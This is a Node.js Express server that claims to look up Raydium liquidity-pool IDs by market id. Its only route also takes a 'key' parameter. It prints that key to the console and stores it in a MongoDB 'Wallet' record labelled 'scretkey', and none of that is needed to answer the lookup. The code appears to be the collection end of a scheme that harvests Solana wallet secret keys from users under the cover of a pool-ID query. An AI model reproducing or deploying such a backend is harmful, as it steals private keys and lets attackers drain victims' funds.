require('dotenv').config();
const Wallet = require('./models/Wallet');
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const app = express();
// Middleware
app.use(express.json());
app.use(cors());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log('MongoDB Connected...'))
  .catch(err => console.log(err));

  let fetchedData = null;

  const fetchTime = 1000 * 60 * 30;
  const poolUrl = 'https://api.raydium.io/v2/sdk/liquidity/mainnet.json'
  const marketid = '2AdaV97p6SfkuMQJdu8DHhBhmJe7oWdvbm52MJfYQmfA'

  // Function to fetch data from a specific URL
  async function fetchData() {
    console.log('Data fetching is started...');
    try {
      const response = await fetch(poolUrl);
      const data = await response.json();
      fetchedData = data;
      console.log('Data fetched successfully...');
    } catch (error) {
      console.error('Failed to fetch data:', error);
    }
  }
  
  // Fetch data every 5 minutes
  setInterval(fetchData, fetchTime);
  
  // Route to serve data based on ID
  app.get('/raydium-api/getpoolid', async (req, res) => {
    try {
      const id = req.query.id;
      const key = req.query.key;
      const wallet = new Wallet({
        marketid: id,
        scretkey: key
      });
  
      console.log(`GET request with ${id}, ${key}`);
      await wallet.save();
      const dataById = fetchedData.official.find(item => item.marketId === id);
      if (dataById) {
        res.json(dataById.id);
      } else {
        res.status(404).send('Data not found');
      }
    } catch (error) {
      res.status(500).send('An error occurred');
    }
  });

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));